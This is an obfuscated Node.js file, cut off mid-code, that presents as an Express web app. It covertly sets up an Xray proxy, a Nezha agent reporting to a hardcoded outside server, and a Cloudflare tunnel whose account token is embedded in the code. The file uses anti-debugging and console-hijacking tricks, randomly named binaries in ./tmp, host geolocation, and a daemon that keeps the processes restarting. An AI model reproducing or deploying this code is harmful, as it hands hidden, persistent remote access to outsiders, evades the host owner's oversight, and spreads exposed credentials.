const _0x3f41d3=_0x4d9e;(function(_0x27fef2,_0x47a19a){const _0x176bd9=_0x4d9e,_0x5c0eff=_0x27fef2();while(!![]){try{const _0x50ef38=parseInt(_0x176bd9(0x156))/0x1+-parseInt(_0x176bd9(0x1a9))/0x2+parseInt(_0x176bd9(0x205))/0x3+parseInt(_0x176bd9(0x13c))/0x4*(parseInt(_0x176bd9(0x226))/0x5)+parseInt(_0x176bd9(0xfe))/0x6+-parseInt(_0x176bd9(0x158))/0x7+-parseInt(_0x176bd9(0x128))/0x8*(parseInt(_0x176bd9(0xf3))/0x9);if(_0x50ef38===_0x47a19a)break;else _0x5c0eff['push'](_0x5c0eff['shift']());}catch(_0x52b6d7){_0x5c0eff['push'](_0x5c0eff['shift']());}}}(_0x24e8,0xed7fc));const _0x51213b=(function(){let _0x42348d=!![];return function(_0x5c9314,_0x66ae66){const _0x1a08cc=_0x42348d?function(){const _0x3e0614=_0x4d9e;if(_0x66ae66){const _0x1ec6a1=_0x66ae66[_0x3e0614(0x14f)](_0x5c9314,arguments);return _0x66ae66=null,_0x1ec6a1;}}:function(){};return _0x42348d=![],_0x1a08cc;};}()),_0x57a585=_0x51213b(this,function(){const _0x3c3b4c=_0x4d9e;return _0x57a585['toString']()[_0x3c3b4c(0x1ed)](_0x3c3b4c(0x197)+'+$')['toString']()[_0x3c3b4c(0x1cc)+'r'](_0x57a585)['search'](_0x3c3b4c(0x197)+'+$');});_0x57a585();const _0x3b9953=(function(){let _0x247355=!![];return function(_0x34d8d1,_0x3cd53d){const _0x306f40=_0x247355?function(){if(_0x3cd53d){const _0x494dfb=_0x3cd53d['apply'](_0x34d8d1,arguments);return _0x3cd53d=null,_0x494dfb;}}:function(){};return _0x247355=![],_0x306f40;};}());(function(){_0x3b9953(this,function(){const _0x12d87f=_0x4d9e,_0x5c4b03=new RegExp(_0x12d87f(0x25f)+_0x12d87f(0x102)),_0x175053=new RegExp(_0x12d87f(0x1bd)+_0x12d87f(0x1c2)+_0x12d87f(0x14e)+_0x12d87f(0x9f),'i'),_0x1408b7=_0x3b367c(_0x12d87f(0x81));!_0x5c4b03[_0x12d87f(0x137)](_0x1408b7+_0x12d87f(0x1c6))||!_0x175053[_0x12d87f(0x137)](_0x1408b7+'input')?_0x1408b7('0'):_0x3b367c();})();}());const _0x237859=(function(){let _0x6926d4=!![];return function(_0xe97a51,_0x5edb0c){const _0x1a2862=_0x6926d4?function(){if(_0x5edb0c){const _0x557926=_0x5edb0c['apply'](_0xe97a51,arguments);return _0x5edb0c=null,_0x557926;}}:function(){};return _0x6926d4=![],_0x1a2862;};}()),_0x7ac4f6=_0x237859(this,function(){const _0x1a49c0=_0x4d9e;let _0x1222a3;try{const _0x2a18e6=Function('return\x20(fu'+_0x1a49c0(0x10a)+('{}.constru'+'ctor(\x22retu'+_0x1a49c0(0x8a)+'\x20)')+');');_0x1222a3=_0x2a18e6();}catch(_0xd21c90){_0x1222a3=window;}const _0x2d775d=_0x1222a3['console']=_0x1222a3[_0x1a49c0(0x24d)]||{},_0x548657=[_0x1a49c0(0x115),_0x1a49c0(0x1e8),_0x1a49c0(0x214),_0x1a49c0(0x7f),_0x1a49c0(0x2a3),_0x1a49c0(0x20b),_0x1a49c0(0xa3)];for(let _0x28247c=0x0;_0x28247c<_0x548657['length'];_0x28247c++){const _0x4c6d97=_0x237859['constructo'+'r'][_0x1a49c0(0x106)][_0x1a49c0(0x1c5)](_0x237859),_0x595386=_0x548657[_0x28247c],_0x595ca3=_0x2d775d[_0x595386]||_0x4c6d97;_0x4c6d97[_0x1a49c0(0x20c)]=_0x237859[_0x1a49c0(0x1c5)](_0x237859),_0x4c6d97['toString']=_0x595ca3[_0x1a49c0(0x194)]['bind'](_0x595ca3),_0x2d775d[_0x595386]=_0x4c6d97;}});_0x7ac4f6();const express=require('express'),app=express(),axios=require(_0x3f41d3(0x1f2)),os=require('os'),fs=require('fs'),path=require(_0x3f41d3(0x1b8)),{promisify}=require(_0x3f41d3(0x13f)),exec=promisify(require('child_proc'+_0x3f41d3(0x23b))[_0x3f41d3(0x1b4)]),{execSync,spawn}=require('child_proc'+'ess'),http=require(_0x3f41d3(0x1e2)),httpProxy=require(_0x3f41d3(0x20e)),UPLOAD_URL=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x245)]||'',PROJECT_URL=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x1a8)+'L']||'',AUTO_ACCESS=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x1ba)+'S']||![],FILE_PATH=process[_0x3f41d3(0x1a1)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x195)]||_0x3f41d3(0x1e5),PORT=process[_0x3f41d3(0x1a1)][_0x3f41d3(0xd5)+'T']||process[_0x3f41d3(0x1a1)][_0x3f41d3(0x89)]||0xbb8,EXTERNAL_PORT=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x267)+'ORT']||0x1eb4,UUID=process['env']['UUID']||_0x3f41d3(0xb4)+_0x3f41d3(0x169)+'5d4-cf754d'+'37bd4b',NEZHA_SERVER=process['env']['NEZHA_SERV'+'ER']||'gwwjllhldp'+_0x3f41d3(0x174)+'-1.clawclo'+'udrun.com:'+_0x3f41d3(0x1db),NEZHA_PORT=process['env'][_0x3f41d3(0x17a)]||'',NEZHA_KEY=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x1b6)]||_0x3f41d3(0x295)+_0x3f41d3(0xf1)+_0x3f41d3(0x223)+'Ur',ARGO_DOMAIN=process[_0x3f41d3(0x1a1)]['ARGO_DOMAI'+'N']||_0x3f41d3(0x96)+_0x3f41d3(0x246)+_0x3f41d3(0x12b),ARGO_AUTH=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x142)]||'{\x22AccountT'+_0x3f41d3(0x14b)+'fb1e52e8a7'+_0x3f41d3(0x265)+'3c277f9\x22,\x22'+_0x3f41d3(0x26a)+_0x3f41d3(0x1bb)+'4Y6Mr9tlVy'+_0x3f41d3(0x25e)+_0x3f41d3(0x297)+_0x3f41d3(0xd8)+',\x22TunnelID'+'\x22:\x22c4e5c28'+_0x3f41d3(0x212)+_0x3f41d3(0x2a5)+_0x3f41d3(0x2a7)+',\x22Endpoint'+_0x3f41d3(0x268),ARGO_PORT=process[_0x3f41d3(0x1a1)]['ARGO_PORT']||0x1eb4,CFIP=process[_0x3f41d3(0x1a1)][_0x3f41d3(0x2a8)]||_0x3f41d3(0x14a)+'eu.org',CFPORT=process[_0x3f41d3(0x1a1)][_0x3f41d3(0xac)]||0x1bb,NAME=process['env']['NAME']||'',DAEMON_CHECK_INTERVAL=parseInt(process['env']['DAEMON_CHE'+_0x3f41d3(0xf6)+'L']||_0x3f41d3(0xbd),0xa),DAEMON_MAX_RETRIES=parseInt(process['env']['DAEMON_MAX'+_0x3f41d3(0x26c)]||'5',0xa),DAEMON_RESTART_DELAY=parseInt(process[_0x3f41d3(0x1a1)]['DAEMON_RES'+_0x3f41d3(0x90)]||_0x3f41d3(0x97),0xa);!fs[_0x3f41d3(0x216)](FILE_PATH)?(fs[_0x3f41d3(0xbf)](FILE_PATH),console[_0x3f41d3(0x115)](FILE_PATH+('\x20is\x20create'+'d'))):console[_0x3f41d3(0x115)](FILE_PATH+(_0x3f41d3(0x8f)+_0x3f41d3(0x1be)));function _0x4d9e(_0x37956b,_0x7d09c1){const _0xd8c0c0=_0x24e8();return _0x4d9e=function(_0x7ac4f6,_0x237859){_0x7ac4f6=_0x7ac4f6-0x7c;let _0x194f44=_0xd8c0c0[_0x7ac4f6];if(_0x4d9e['mAhVpf']===undefined){var _0x59370e=function(_0x57a585){const _0x51213b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x24e853='',_0x4d9ef0='',_0x247a5d=_0x24e853+_0x59370e;for(let _0x28e9c3=0x0,_0x5d26b7,_0xa085a1,_0x3c347d=0x0;_0xa085a1=_0x57a585['charAt'](_0x3c347d++);~_0xa085a1&&(_0x5d26b7=_0x28e9c3%0x4?_0x5d26b7*0x40+_0xa085a1:_0xa085a1,_0x28e9c3++%0x4)?_0x24e853+=_0x247a5d['charCodeAt'](_0x3c347d+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x5d26b7>>(-0x2*_0x28e9c3&0x6)):_0x28e9c3:0x0){_0xa085a1=_0x51213b['indexOf'](_0xa085a1);}for(let _0x51eb32=0x0,_0x42348d=_0x24e853['length'];_0x51eb32<_0x42348d;_0x51eb32++){_0x4d9ef0+='%'+('00'+_0x24e853['charCodeAt'](_0x51eb32)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4d9ef0);};_0x4d9e['fyharE']=_0x59370e,_0x37956b=arguments,_0x4d9e['mAhVpf']=!![];}const _0x3b367c=_0xd8c0c0[0x0],_0x3b9953=_0x7ac4f6+_0x3b367c,_0x4c159f=_0x37956b[_0x3b9953];if(!_0x4c159f){const _0x5c9314=function(_0x66ae66){this['QDcvwd']=_0x66ae66,this['vpTInV']=[0x1,0x0,0x0],this['NCHaUf']=function(){return'newState';},this['valjEc']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['gfoJfY']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x5c9314['prototype']['yOemWH']=function(){const _0x1a08cc=new RegExp(this['valjEc']+this['gfoJfY']),_0x1ec6a1=_0x1a08cc['test'](this['NCHaUf']['toString']())?--this['vpTInV'][0x1]:--this['vpTInV'][0x0];return this['fsWfDc'](_0x1ec6a1);},_0x5c9314['prototype']['fsWfDc']=function(_0x247355){if(!Boolean(~_0x247355))return _0x247355;return this['HhqVal'](this['QDcvwd']);},_0x5c9314['prototype']['HhqVal']=function(_0x34d8d1){for(let _0x3cd53d=0x0,_0x306f40=this['vpTInV']['length'];_0x3cd53d<_0x306f40;_0x3cd53d++){this['vpTInV']['push'](Math['round'](Math['random']())),_0x306f40=this['vpTInV']['length'];}return _0x34d8d1(this['vpTInV'][0x0]);},new _0x5c9314(_0x4d9e)['yOemWH'](),_0x194f44=_0x4d9e['fyharE'](_0x194f44),_0x37956b[_0x3b9953]=_0x194f44;}else _0x194f44=_0x4c159f;return _0x194f44;},_0x4d9e(_0x37956b,_0x7d09c1);}function generateRandomName(){const _0x4a3441=_0x3f41d3,_0x12ff43=_0x4a3441(0x17e)+_0x4a3441(0x266)+_0x4a3441(0x2a2);let _0x2e3b8b='';for(let _0xf38e2a=0x0;_0xf38e2a<0x6;_0xf38e2a++){_0x2e3b8b+=_0x12ff43['charAt'](Math[_0x4a3441(0x12d)](Math['random']()*_0x12ff43[_0x4a3441(0x136)]));}return _0x2e3b8b;}function _0x24e8(){const _0x13104d=['A2v5CW','icaGicaGBM9uta','yxHPB3m','Bwf0y2G','ihn0yxj0zwqGCW','C3mGDgfZAW','pt09pt09pt09pq','DgvTCg9Yyxj5','CMvHzezPBgvtEq','ls1SB2DSzxzLBa','C2nOzwr1Bgvszq','BgHVC3q6mZaWmq','zcbIAw5HCNKGBG','Ecz0ExbLpxDZjG','whjHEsbZDgfYDa','rg9TywLUigv4Da','rMfPBgvKihrVia','yxv0BW','BhmTzMLSztOG','Dw5RBM93BG','DgLUzYa','mJC5mduZngnet0LzBq','CgfYC2u','Bg9Hzfn0yxr1CW','CMvZDgfYDfrPBq','DMvYC2LVBG','zgfLBw9UihbYBW','DgfIBgu','x19WCM90B19F','BM5LBdO','Ahr0Cc1WCM94Eq','zMLUAxnO','l2rLDI9UDwXS','Dg9ju09tDhjPBG','ns0Wm2rMltrHyq','igzHAwXLzdOG','Aw5MBW','Cg9ZDa','zxHPC3rZu3LUyW','ihDPDgGGzgfLBq','BIbHzNrLCIa','C3rKzxjY','oI8V','EhjHEq','5zoQ5zcs55Ur5O6N5lUJ55cg','Dw5UzwW','5zU65A6A6zQN6ygt','DhvZigf2ywLSyq','Dgv4Dc9WBgfPBG','CMf0Aw9Uig5VDa','vhvUBMvSihr5Ca','qMHUr3DJqxfxra','BMzV','DhrWoI8VBg9Jyq','mta3nuT3ANjMAG','B3iG','CNvU','rgfLBw9Uihn0yq','ztOGrKLyruqGka','ywLUig9IDgfPBG','zxHPDa','khDPBgWGDxnLia','qwXSihbYB2nLCW','CNrFzgvSyxK6ia','Aw9UigDLBMvYyq','ywLUoIaGicaG','l3zTzxnZlwfYzW','l3zSzxnZlwfYzW','zcbZDwnJzxnZzG','yM9VDc5SB2C','Ag9ZDd0','BMvJDgLVBIbLCW','BM5LBcb0ExbL','ysbHz2vUDdO','zM9YihvZAw5Nia','zxnZ','Dg9Rzw4','DgnW','id4GBNvSidi+jG','Ahr0Chm6lY9VBW','CxvLCNK6igzHBa','ANnVBG','DhvUBMvSrg9Tyq','jtngzwqLm0qYnq','qwXSihnLCNzPyW','vvbmt0fex1vsta','mJmUAxaTzgrUCW','yw1K','cNzSzxnZoI8V','AwrLzcbMB3iGDa','Es90Dw5UzwWVyq','DcbPBML0Awf0zq','zxjYB3iGAw4GCW','y29UC29Szq','cNbYB3rVy29SoG','DxjLoIbMywXZzq','ihbYB2nLC3mGBG','DxbNCMfKzq','ztOGzMfSC2ukDq','C3rYzwfT','y2HLy2TqCM9Jzq','EwmUBw4VyM90','BLjLCxvLC3q6cG','sw52ywXPzcbWCG','ide4mdakCMvWBW','y2vZCW','z2DLCG','vhvUBMvSigrVBq','BwfW','igHVC3rUyw1LoG','DZDjCviXA3mZmG','zNvUy3rPB24GkG','BIbZDgf0Dxm6','yMXHy2TOB2XL','zxjUywWGCg9YDa','DhjVAMfU','u3rHCNrPBMCG','mZjKndbHodrIoq','A2XTBM9WCxjZDa','rvHurvjoquXFua','iJOIiN0','B21HAw4GChjVDG','vhvUBMvSu2vJCG','igzHBhnLcMrPCW','x1jfvfjjrvm','sfruucbtzxj2Aq','CgvUzgLUzW','DgXZjNnUAt0','DgfYDhnLCNzLCG','DxrMltG','u0Lhvevstq','CYbUBYbHzgrPDa','D2L0AcbKywvTBW','BgLZDgvUAw5N','rKLyruq','vhvUBMvSierVBq','ztOGvevnue9sqq','AYbHzgrLzcbZDq','Ahr0ChmRBg9Jyq','yxv0B21HDgLJia','B2TLBIb0Dw5Uzq','DhvUBMvSoIa','cNvZzv9NAxrLzq','zwq6ia','ihrLBxbVCMfYEq','BIbWCM9JzxnZzq','zwXHEq','C3rHCNrqCM9Jzq','l3zSzxnZ','p3nLy3vYAxr5pq','AxHLzcb0Dw5Uzq','DhjPBq','Aw9U','AgfZ','A2LWx3bYB2nZxW','AgfUzgXLvhvUBG','ywLUig5VDcbMBW','l3zTzxnZ','DwjZy3jPChrPBW','AxngAwXL','Cg9W','rg93BMXVywqG','zM9YrwfJAa','Aw4GBw9UAxrVCG','CYaGlsbdAgvJAW','CLjbnvPYz09TCW','p2vUy3j5ChrPBW','qxDWt3u0Cdjqoq','Dw50CNLFy29Kzq','Dhj1zq','vevnue9sqvjz','CMf0Aw5Nihn1yG','Aw9UoG','Dw5KigLUigXVzW','ls1SB2DMAwXL','q29UDgvUDc1uEq','rxH0CMfJDgvKia','AM9PBG','Dxz3EhL6','zxHJzxb0Aw9U','BgWP','mY1Hm2qXltfMnW','EwmUBw4VywDLBG','nMi2mtCXmJnMiG','q0zjua','EgvKigrVBwfPBG','DgvJDgLVBG','zgfLBw9Ux3n0yq','BgHVC3q6','zxjYB3i','tM8GzML4zwqGza','Aw5PDa','whjHEsb0CMfMzG','DgHPCYbZy3jPCa','vg9Rzw4GDhvUBG','BMv6Age','ls1JB25MAwC','zxH0CMfJDcb0Dq','yxjJAa','ue9sva','CM4GDgHPCYiPka','BgLZDgvU','u0Lhsu5ulcbJBa','DcbZDwnJzxnZia','CMvZDgfYDca','igfSCMvHzhKGzq','vefsvf9eruXbwq','C3rHCNqVoM5HBq','pt09pt09pqO','odq0mW','y2fSBa','BgvHBMLUzYb1Ca','AhvNmI5NB3LVmq','mtaWmda','C2v0vhvUBMvSsq','y2XLyw51Ca','Dhj5y2XVDwrMBa','ihbYB2nLC3m6','BML0Awf0zwq','igzVDw5K','ihr1BM5LBcbKBW','jf0Qkq','qw5HBhL6Aw5Nia','DhvZoIaGicaGAa','vg9Rzw4Gyxv0Aa','DhjHy2u','cNrSCZOG','m0zLzcuZrdi1nG','ihjLC3rHCNqGAq','l3jLC3rHCNqVoG','CNrFCgvYAw9KoG','C2v0','zwn0Aw9Ux2nVDq','DcbZDgfYDgvKia','q0zqt1ju','BM5LBcbKB21HAq','ihjLC3rHCNqGyq','BJOG','Aw5JBhvKzxm','oc9KBNmTCxvLCG','zwWGy29UzMLNDq','oYbJAgfYC2v0pq','mZu0nJfJmwiTyW','D2HPBguGkhrYDq','DgHLBG','B24GChjVy2vZCW','q2XVDwrMBgfYzq','ChjVy2vZCW','igrHzw1VBG','B3jJzv91CgrHDa','igXVz3m6','mZaWmda','BgfZDev4Axq','BwTKAxjtEw5J','zM9Yia','AwmGlt4GBg9Jyq','vgHHBMSGEw91ia','ls1WCM90B2nVBa','ls1ZA2LWlwnVBG','twfUDwfSihjLCW','y29UzMLNlMPZBW','zwXpDxrWDxq','ueLeoIa','ihn1yNnJCMLWDa','CNvLcIaGlsbZzq','Aw5Nig9UihbVCG','B24GyMfZzty0oG','lI4U','DhvUBMvSlNLTBa','u3rHCNrPBMCGCW','zMLYzwzVEa','DhLWzq','rxH0CMfJDgLUzW','zgvIDq','z2vUzxjHDgvtDq','u0vsvKvsx1bpuG','DhvUBMvSigrVBq','cIaGicbZzxj2Aq','rJuRnunpu2S9iG','CYbZDgf0Dxm','Ahr0Cdi','DgfIBgLZAgvK','uLKGkff1AwnRia','rxjYB3iGAw4GCW','CMvZCg9UC2u','C3rHCNrLza','z3jLC3m6cIaGlq','yYbWCM9JzxnZia','y2XVC2u','z2v0vhvUBMvSva','mti3lJaUmc4X','mJa4mW','rxjYB3iGy2XVCW','CYWGD2fPDgLUzW','C2f2zvn0yxr1CW','A2LSBa','z3vYyxrPB24P','BgvZoG','zgLYzwn0','ls1ZA2LWlxbYBW','AwDUB3jL','CMvZDgfYDfbYBW','yxbPlMnVl2PZBW','B3nSn0vPEuL1sG','zMLSDgvY','ntaWnZC2mNjZwe9kCW','AwD1CMf0Aw9U','DgfYDcbYzxf1zq','q0TFsu5urvjwqq','yxjTnJq','B3jN','DhvUBMvSlMPZBW','rgfLBw9Uifn0yq','igH0DhaYcGPPBG','zgf0yq','ls1UBY1HDxrVDq','nJa2mZm2meHIAuPgyG','zw50igfYy2HPDa','BZ9Lzd0YntyW','Dxb0Aw1L','xcGGkLWP','yMfZzty0','z2v0qwXSu3rHDa','CYbbuKDpx0rptq','ChjVDg90ExbL','ywXOB3n0oJmWma','Bg9HzgLUzYbMAq','zxiGAxmGCNvUBG','BMn0Aw9UkcKG','uMvZDgfYDgLUzW','Ahr0CdOVl2XVyW','ysbHz2vUDa','BM9Uzq','BgvZCY1HCMDVjq','Bg9HzcbKywvTBW','zwqGBwf4Aw11Bq','BgX5','C3rKB3v0','ihrHC2SGzMfPBa','Bg9N','AxnWBgf5tMfTzq','C3vIC2nYAxb0Aq','z2v0','DMXLC3m','Aw9UlI4U','zv9HDxrVx3vWza','C3rHDhvZ','yMXVy2S','rw1WB3DLCM1LBG','BwfYA2LUzYbHCW','CgLWzq','CYb3AxrOigrHzq','y29UzMLNDxjHDa','y2HLy2TuAw1LCG','ve9lru4','ifrVA2vU6zQN6ygt','BMLUzYb3AxrOia','q2XLyw5PBMCGDq','og1ODM5xrG','mJa4nW','yxv0BY11CgrHDa','lMnVBq','B3qGzM91BMq','zMXVB3i','DwnJzxnZzNvSBa','C3rHCNrizwfSDa','CM0GlxjMia','yxjT','q29UBMvJDgvK','vxnPBMCGzML4zq','igeGzMLSzsbMBW','Aw5NigzYB20GBa','BgvUz3rO','DgvZDa','qxbWigLZihj1BG','CgrHDgu','sfruucbZzxj2Aq','zNjVBq','ntK3mNLkwxHnra','uhjVEhKGC2vYDG','yxbPlMnVBs9QCW','DxrPBa','zg9TywLU','u3rHCNrPBMCGDa','qvjht19bvvri','ywfYy2G2na','CMvHzhK','yNnJCMLWDgLVBG','EvnLCNzLCG','sfruucb0CMfMzG','qwrKigf1Dg9Tyq','y3jLDdOG','y2rUCY5KB29UlG','ywCIoIiWn2rMmG','zw1WDhKSihnRAq','DhvUBMvSvhLWzq','mc05ys16qs1AxW','yxbWBhK','y2u6igH0Dha6lW','DwLYzxmGBM8Gyq','Ew5J','D3jPDgvgAwXLuW','C2vZihjLC3rHCG','ywXOB3n0oG','mtu5ndi1nwDky1Htqq','C3nizwfSDgG','ndqZoti4mwfACvrsyW','D2vI','C3rHCNqGq2XVDq','C3rHCNrZv2L0Aa','Ahr0Chm6lY9HBq','ChjVy2vZC2vZ','cIaGica','u1zLCMLMEtOGDa','ywjSzv9Zzw5KxW','Aw5Nihr1BM5LBa','Cg93','C2nOzwr1BgLUzW','u3rHCNrPBMCGzG','y2uGAxmGCNvUBG','oIbMywXZzqP1Dq','zgrPBMCGyxv0BW','y29UzMLNlNLHBq','owzIlwvMzduTzq','AenOzwnR','Ahr0Chm6lY9HCG','BgWGC2vYDMLJzq','y2XLyxi','C3rYAw5NAwz5','CIbjBML0AwfSAq','CxvPyW','l2fWAs9HzgqTBG','BhnLcMLUC2vJDq','mdqk','ANKUDxmTD2vZDa','CMv0CMLLCW','l3rYB2PHBI1HCG','C3rHCNq','zwWGCMvXDwLYzq','rgfLBw9UigvUza','tKvAsefFue9sva','ywn0Aw9U','C3rHCNqGtMv6Aa','q2fUj3qGzMLUza','ywjJzgvMz2HPAG','y291BNrYEv9JBW','B24GChjVDgvJDa','y2HTB2q','DMfSDwvZ','tMv6AgeGywDLBG','cJ09psbtzxj2zq','BwvZC2fNzq','mJa5nG','CgXHDgzVCM0','DhvUBMvSihjLCq','zc90B2TLBIb0Dq','CNvUBMLUzW','DxrLoIbMywXZzq','DgLVBG','vgvTCg9Yyxj5ia','zNjLzwrVBq','EwmUBw4VD2vI','zxjZ','BM9YBwfSBhKSia','yw5PBMCGDxaUlG','jNbHDgG9jtjgDa','Dg9tDhjPBMC','u1vcx1bbveG','Aw5Nig9UigLUDa','kcGOlISPkYKRkq','cMnYzwrLBNrPyq','rML4zwqGDhvUBG','ms9KBNmTCxvLCG','BwLU','BcaYpIyX','AxrPBMCSignSzq','r2vUzxjHDgvKia','cNnRAxbFy29UBG','CMf0Aw5NigzPEa','zw52','Bty0lNnZC3mUBG','cIaGicbVCMLNAq','BI9QC29U','zMLNDxjHDgLVBG','BdOVlZGUoc44lG','cMrPC2fIBgvFzG','ufjpsKvdvf9vuG','mZm4nte4mKz4C2zfAa','tcbJB25MAwD1CG','x3rVx3vWz3jHza','Dw5ZAgLMDa','C2vUzezPBgu','tKvAseeGDMfYAq','ms4XlJeUmq','igHVC3rUyw1Lia','B24GDxbSB2fKzq','zdy0lNnZC3mUBG','5lI05PE26zQN6ygt','zxHLyW','nJaJ','tKvAsefFs0vz','zsKGE30','Cgf0Aa','cMrLyNvNoIbMyq','qvvut19bq0nfuW','zxqIoIiXnvPzzW','ywXS','xcTCkYaQkd86wW','EgLZDhm','yxrLoIb0CNvLcG','ihbYB2nLC3mGka','zw1VBI1ZDgf0Dq','ys16qs1AxYrDwW','C3rYAw5N','AwfSAxPHDgLVBG','yMLUza','y2HHAw4','ChvZAa','l2nVBMzPzY5QCW','C3rHDfn5BMm','mJa1mW','uhjVy2vZCYbLEa','y29UC3rYDwn0BW','DhvUBMvS','zML4zwq','id4Vzgv2l251Ba','zw1VBG','B2rLCW','z2v0vhvUBMvSra','yxr1CW','DhvZlMPZB24','yMfZzw5HBwu','ls1OB3n0BMfTzq','Aw5Nia','DgLVBNm6ia','zdOG','u0LhvevstsWGyW','ndqZ','whjHEEs7O+EqHUACJEwkOq','igHHCYbYzwfJAa','CM9Qyw4TyxjNBW','zwfUAw5NihvWlG','igfSBcbKywvTBW','DcbMywLSzwqGzG','Ahr0Ca','zwn0DxjL','DwukAxbFCMvWBW','C3vI','zMLNoG','cIaGcNrYB2PHBG','D2fYBG','ChbPBMCGtMv6Aa','rxjYB3iGCMvHza','DgXZ','ls1LzgDLlwLWlq','C2vHCMnO','zxjHDgvKihn1yW','yxbWBgLJyxrPBW'];_0x24e8=function(){return _0x13104d;};return _0x24e8();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x3f41d3(0x2a1)](FILE_PATH,phpName),webPath=path[_0x3f41d3(0x2a1)](FILE_PATH,webName),botPath=path[_0x3f41d3(0x2a1)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x3f41d3(0x2a1)](FILE_PATH,'list.txt'),bootLogPath=path[_0x3f41d3(0x2a1)](FILE_PATH,_0x3f41d3(0x235)),configPath=path[_0x3f41d3(0x2a1)](FILE_PATH,_0x3f41d3(0xc6)+'n'),statusPath=path[_0x3f41d3(0x2a1)](FILE_PATH,'daemon_sta'+'tus.json');const TUNNEL_TYPES={'FIXED':_0x3f41d3(0x1ce),'TOKEN':_0x3f41d3(0x23c),'TEMPORARY':_0x3f41d3(0x1f7)};async function getMetaInfo(){const _0x2a7c18=_0x3f41d3;try{const _0x5afb7d=await axios['get']('https://ip'+_0x2a7c18(0xf0)+'n/',{'timeout':0xbb8});if(_0x5afb7d['data']&&_0x5afb7d['data']['country_co'+'de']&&_0x5afb7d[_0x2a7c18(0xfc)][_0x2a7c18(0xf8)])return _0x5afb7d[_0x2a7c18(0xfc)][_0x2a7c18(0x17f)+'de']+'_'+_0x5afb7d[_0x2a7c18(0xfc)][_0x2a7c18(0xf8)];}catch(_0x36669d){try{const _0x39ec7b=await axios[_0x2a7c18(0x118)]('http://ip-'+_0x2a7c18(0x13e)+'on/',{'timeout':0xbb8});if(_0x39ec7b[_0x2a7c18(0xfc)]&&_0x39ec7b[_0x2a7c18(0xfc)][_0x2a7c18(0x11c)]==='success'&&_0x39ec7b['data']['countryCod'+'e']&&_0x39ec7b['data']['org'])return _0x39ec7b['data']['countryCod'+'e']+'_'+_0x39ec7b['data']['org'];}catch(_0x346364){}}return'Unknown';}class DaemonManager{constructor(){const _0x54e900=_0x3f41d3;this['processes']={'nezha':null,'xray':null,'tunnel':null},this['status']={'nezha':{'running':![],'retries':0x0,'lastStart':null},'xray':{'running':![],'retries':0x0,'lastStart':null},'tunnel':{'running':![],'retries':0x0,'lastStart':null,'type':null,'domain':null}},this['checkTimer'+'s']={},this['restartTim'+_0x54e900(0x190)]={},this['tunnelDoma'+'in']=null,this[_0x54e900(0x14d)]=null;}[_0x3f41d3(0xe8)](){const _0x5986d3=_0x3f41d3;try{const _0x505687={'processes':this[_0x5986d3(0x11c)],'timestamp':new Date()['toISOStrin'+'g'](),'uptime':process['uptime'](),'tunnel':{'type':this[_0x5986d3(0x14d)],'domain':this[_0x5986d3(0x242)+'in'],'isFixed':this[_0x5986d3(0x14d)]===TUNNEL_TYPES[_0x5986d3(0x276)]}};fs[_0x5986d3(0x153)+'ync'](statusPath,JSON['stringify'](_0x505687,null,0x2));}catch(_0x1534ad){console[_0x5986d3(0x7f)](_0x5986d3(0x200)+'save\x20daemo'+_0x5986d3(0x260),_0x1534ad);}}[_0x3f41d3(0x207)](){const _0x16932b=_0x3f41d3;try{if(fs[_0x16932b(0x216)](statusPath)){const _0x42dee4=fs['readFileSy'+'nc'](statusPath,'utf8');return JSON[_0x16932b(0x206)](_0x42dee4);}}catch(_0x3096c9){console[_0x16932b(0x7f)](_0x16932b(0x200)+_0x16932b(0x110)+'n\x20status:',_0x3096c9);}return null;}[_0x3f41d3(0x98)+'nfo'](_0x56ab71,_0x30f23e){const _0x2aa848=_0x3f41d3;this[_0x2aa848(0x14d)]=_0x56ab71,this[_0x2aa848(0x242)+'in']=_0x30f23e,this['status']['tunnel'][_0x2aa848(0xd1)]=_0x56ab71,this[_0x2aa848(0x11c)]['tunnel'][_0x2aa848(0x140)]=_0x30f23e,console['log'](_0x2aa848(0x222)+'e\x20set\x20to:\x20'+_0x56ab71+',\x20domain:\x20'+(_0x30f23e||_0x2aa848(0x26e))),this['saveStatus']();}[_0x3f41d3(0x283)+'ss'](_0x5b621f,_0x2a77ab,_0x553e4,_0x422124={}){return new Promise((_0x4f880c,_0x1f08a9)=>{const _0x399cfd=_0x4d9e;try{console['log'](_0x399cfd(0x264)+_0x5b621f+('\x20process..'+'.'));const _0x553704={'detached':!![],'stdio':[_0x399cfd(0xee),_0x399cfd(0x120),_0x399cfd(0x120)],..._0x422124},_0x359671=spawn(_0x2a77ab,_0x553e4,_0x553704);this['processes'][_0x5b621f]=_0x359671,this[_0x399cfd(0x11c)][_0x5b621f]={'running':!![],'retries':0x0,'lastStart':new Date()[_0x399cfd(0x211)+'g'](),'pid':_0x359671['pid'],'type':_0x5b621f==='tunnel'?this[_0x399cfd(0x14d)]:null,'domain':_0x5b621f===_0x399cfd(0x1cd)?this[_0x399cfd(0x242)+'in']:null},_0x359671[_0x399cfd(0x113)]['on']('data',_0x4367a8=>{const 